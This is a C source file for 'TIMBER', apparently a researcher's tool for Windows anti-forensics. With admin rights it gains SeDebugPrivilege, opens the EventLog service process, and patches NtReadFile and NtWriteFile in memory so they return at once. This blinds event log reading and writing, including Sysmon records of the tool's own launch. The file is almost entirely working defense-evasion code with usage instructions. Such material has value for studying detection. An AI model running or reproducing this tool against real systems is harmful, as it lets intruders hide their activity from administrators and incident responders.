/*
						TIMBER by Wra7h

	This is just some friggin around to find out code. You'll need to run as admin. 

	The idea is to modify the function for NtReadFile and NtWriteFile for the EventLog service process 
	to basically immediately return. Luckily it's easy to find these functions because they should be at the
	same memory address in every process. So when attempting to disable one of these functions, you just have
	to call GetModuleHandle for ntdll.dll and then GetProcAddress for the NT function.

	Some of the things I've learned disabling NtReadFile:
		- The native tools (the few that I know of) on Windows rely on the service to parse the evtx. So things like
		  Event Viewer, wevtutil, and PowerShell Get-WinEvent/Get-EventLog can't get the event log data. 
		
		- So next I thought of moving a copy of the evtx file to another directory for "offline" access. Surely the
		  PowerShell Cmdlets, wevtutil and Event Viewer are capable of parsing the XML? Nope, this fails as well. 
		  NOTE: I have not tested any third-party tools out there for log parsing and forwarding.

		- Once overwriting the "disable" bytes with the correct bytes, the reading functionality for PowerShell 
		  Cmdlets/Event Viewer/wevtutil is back.

		- With the disable in place, I also couldn't open .etl files with Event Viewer or Get-WinEvent.

	Some of the things I've learned disabling NtWriteFile:
		- This is a weird one. So you've overwritten the process' call to NtWriteFile. If you query a log, you will see 
		  events that have been written after the disable. If you browse to C:\Windows\system32\winevt\Logs and open your
		  favorite log, you will still see events after the disable. However, try copying that favorite log to a new location.
		  After the file shows up in the new location, reenable the NtWriteFile. Open that offline log and you will see that
		  events were not written - at least for the Sysmon log I was using. 
		
		- Fun Finding: Timber's disabling occurs before Sysmon sends the "EventId 1: Process Create" data to the EventLog
		  service. So when viewing that copied Sysmon/Operational log in the new location, I couldn't even see that Timber 
		  executed. CAVEAT - now that the NtWriteFile function has been reenabled, the service plays "catch up" and dumps
		  all those "missing events" into the real Sysmon/Operational log (at least it did on my test systems).

		- Also if you restart the system with the NtWriteFile disabled, it seems that all those events just chillin in memory
		  are just dumped. On reboot, I didn't see any "events dropped" in the logs.

	I also played around with NtCreateFile using the same methodology- but I was more intrigued with the system's reliance on
	NtReadFile/NtWriteFile. ***Also, if NtCreateFile is "disabled" and you log off, the system didn't return me to the logon screen.
*/

#include <stdio.h>
#include <Windows.h>

BOOL GetEventLogServicePID(PDWORD);
BOOL DisableFunction(HANDLE, PSTR);
BOOL RecoverFunction(HANDLE, PSTR);
BOOL EnablePrivs(PSTR);

INT main(INT argc, PCHAR argv[])
{
	BOOL Ret = FALSE;
	DWORD dwTargetProcessId = 0;
	HANDLE hTargetProcess = NULL;

	BOOL bvDisableRead = FALSE;
	BOOL bvEnableRead = FALSE;
	BOOL bvDisableWrite = FALSE;
	BOOL bvEnableWrite = FALSE;

	if (argc < 2)
	{
		printf("\tTIMBER by Wra7h\n");
		printf("-dr   Disable evtx reading\n");
		printf("-dw   Disable evtx writing\n");
		printf("-er   Enable evtx reading\n");
		printf("-ew   Enable evtx writing\n");

		printf("Example: .\\timber.exe -dw\n");
		printf("Example: .\\timber.exe -dw -dr\n");
		printf("Example: .\\timber.exe -er\n");
		printf("Example: .\\timber.exe -ew -er\n");
		return 0;
	}

	for (INT i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "-h") == 0)
		{
			printf("\tTIMBER by Wra7h\n");
			printf("-dr   Disable evtx reading\n");
			printf("-dw   Disable evtx writing\n");
			printf("-er   Enable evtx reading\n");
			printf("-ew   Enable evtx writing\n");

			printf("Example: .\\timber.exe -dw\n");
			printf("Example: .\\timber.exe -dw -dr\n");
			printf("Example: .\\timber.exe -er\n");
			printf("Example: .\\timber.exe -ew -er\n");
			return 0;
		}

		if (strcmp(argv[i], "-er") == 0)
		{
			bvEnableRead = TRUE;
		}

		if (strcmp(argv[i], "-ew") == 0)
		{
			bvEnableWrite = TRUE;
		}

		if (strcmp(argv[i], "-dr") == 0)
		{
			bvDisableRead = TRUE;
		}

		if (strcmp(argv[i], "-dw") == 0)
		{
			bvDisableWrite = TRUE;
		}
	}

	if (!(bvEnableRead || bvEnableWrite || bvDisableRead || bvDisableWrite))
	{
		printf("\tTIMBER by Wra7h\n");
		printf("-dr   Disable evtx reading\n");
		printf("-dw   Disable evtx writing\n");
		printf("-er   Enable evtx reading\n");
		printf("-ew   Enable evtx writing\n");

		printf("Disable writing: .\\timber.exe -dw\n");
		printf("Disable reading/writing: .\\timber.exe -dw -dr\n");
		printf("Enable reading: .\\timber.exe -er\n");
		printf("Enable reading/writing: .\\timber.exe -ew -er\n");
		return 0;
	}

	if (bvEnableRead && bvDisableRead)
	{
		printf("[~] Disable AND Enable NtReadFile??? What. Exiting...\n");
		return 1;
	}

	if (bvEnableWrite && bvDisableWrite)
	{
		printf("[~] Disable AND Enable NtWriteFile??? What. Exiting...\n");
		return 1;
	}

	//-----------------------//

	Ret = EnablePrivs("SeDebugPrivilege");

	if (!Ret)
	{
		printf("[!] Failed to enable SeDebugPrivilege\n");
		goto CLEANUP;
	}
	else
	{
		printf("[+] SeDebugPrivilege enabled.\n");
	}

	Ret = GetEventLogServicePID(&dwTargetProcessId);

	if (!Ret)
		goto CLEANUP;

	printf("[+] EventLog Service PID: %u\n", dwTargetProcessId);

	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetProcessId);
	if (hTargetProcess == NULL)
	{
		printf("[!] OpenProcess: Failed to get handle to target process\n");
		goto CLEANUP;
	}

	if (bvDisableWrite)
	{
		Ret = DisableFunction(hTargetProcess, "NtWriteFile");
		if (!Ret)
			goto CLEANUP;
		else
			printf("[+] Overwrote NtWriteFile for PID:%u\n", dwTargetProcessId);
	}

	if (bvDisableRead)
	{
		Ret = DisableFunction(hTargetProcess, "NtReadFile");
		if (!Ret)
			goto CLEANUP;
		else
			printf("[+] Overwrote NtReadFile for PID:%u\n", dwTargetProcessId);
	}

	if (bvEnableWrite)
	{
		Ret = RecoverFunction(hTargetProcess, "NtWriteFile");
		if (!Ret)
			goto CLEANUP;
		else
			printf("[+] Recovered NtWriteFile in %u\n", dwTargetProcessId);
	}

	if (bvEnableRead)
	{
		Ret = RecoverFunction(hTargetProcess, "NtReadFile");
		if (!Ret)
			goto CLEANUP;
		else
			printf("[+] Recovered NtReadFile in %u\n", dwTargetProcessId);
	}

CLEANUP:
	if (hTargetProcess != NULL)
		CloseHandle(hTargetProcess);

	return 0;
}

BOOL GetEventLogServicePID(PDWORD ProcessID)
{
	BOOL Ret = FALSE;
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE hService = NULL;
	SERVICE_STATUS_PROCESS* sSSP = NULL;

	hSCManager = OpenSCManager(NULL, NULL, 0);

	if (hSCManager == NULL)
	{
		printf("[!] OpenSCManager failed. Exiting...");
		goto CLEANUP;
	}

	hService = OpenService(hSCManager, L"EventLog", SERVICE_QUERY_STATUS);
	if (hService == NULL)
	{
		printf("[!] OpenService failed. Exiting...");
		goto CLEANUP;
	}

	sSSP = malloc(sizeof(SERVICE_STATUS_PROCESS));

	DWORD dwBytesNeeded = 0;
	Ret = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, sSSP, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded);
	if (!Ret)
	{
		printf("[!] QueryServiceStatusEx failed. Exiting...");
		goto CLEANUP;
	}

	*ProcessID = sSSP->dwProcessId;

CLEANUP:
	if (hSCManager)
		CloseServiceHandle(hSCManager);

	if (hService)
		CloseServiceHandle(hSCManager);

	if (sSSP)
		free(sSSP);

	return (*ProcessID != 0) ? TRUE : FALSE;
}

BOOL DisableFunction(HANDLE hTargetProcess, PSTR szNtFunctionName)
{
	// xor eax,eax <- the returned value will be 0.
	// ret
	BYTE Disable[] = { 0x31, 0xC0, 0xC3 };

	HANDLE hModule = NULL;
	FARPROC pFunc = NULL;
	BOOL Ret = FALSE;

	hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule == NULL)
	{
		printf("[!] GetModuleHandle: Failed to get handle to ntdll.dll.\n");
	}

	pFunc = GetProcAddress(hModule, szNtFunctionName);

	if (pFunc == NULL)
		printf("[!] GetProcAddress: Failed to get function pointer.\n");
	else
		printf("[~] Overwriting %s: 0x%p with [0x%02X 0x%02X 0x%02X]\n", szNtFunctionName, pFunc, Disable[0], Disable[1], Disable[2]);

	Ret = WriteProcessMemory(hTargetProcess, pFunc, Disable, sizeof(Disable), NULL);

	if (!Ret)
		printf("[!] WriteProcessMemory: Failed to overwrite function in target process.");

	return Ret;
}

BOOL RecoverFunction(HANDLE hTargetProcess, PSTR szNtFunctionName)
{
	BYTE Recover[3];

	HANDLE hModule = NULL;
	FARPROC pFunc = NULL;
	BOOL Ret = FALSE;

	hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule == NULL)
	{
		printf("[!] GetModuleHandle: Failed to get handle to ntdll.dll.\n");
	}

	pFunc = GetProcAddress(hModule, szNtFunctionName);

	if (pFunc == NULL)
		printf("[!] GetProcAddress: Failed to get function pointer.\n");
	else
		printf("[~] Address to overwrite for %s: 0x%p\n", szNtFunctionName, pFunc);

	//Grab the bytes from our current process' NtReadFile/NtWriteFile function
	memcpy(Recover, pFunc, sizeof(Recover));

	printf("[~] Grabbed first 3 bytes for %s [0x%02X 0x%02X 0x%02X] from current process\n", szNtFunctionName, Recover[0], Recover[1], Recover[2]);

	// Overwrite the address in the target process that was disabled.
	Ret = WriteProcessMemory(hTargetProcess, pFunc, Recover, sizeof(Recover), NULL);

	if (!Ret)
		printf("[!] WriteProcessMemory: Failed to overwrite %s function in target process.\n", szNtFunctionName);

	return Ret;
}

BOOL EnablePrivs(PSTR lpszPrivilege)
{
	BOOL Ret = FALSE;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	Ret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if (!Ret)
	{
		printf("[!] OpenProcessToken error: %u\n", GetLastError());
		goto CLEANUP;
	}

	Ret = LookupPrivilegeValueA(NULL, lpszPrivilege, &luid);

	if (!Ret)
	{
		printf("[!] LookupPrivilegeValue error: %u\n", GetLastError());
		goto CLEANUP;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	Ret = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

	if (!Ret)
	{
		printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError());
	}

CLEANUP:
	if (hToken != NULL)
		CloseHandle(hToken);
	return Ret;
}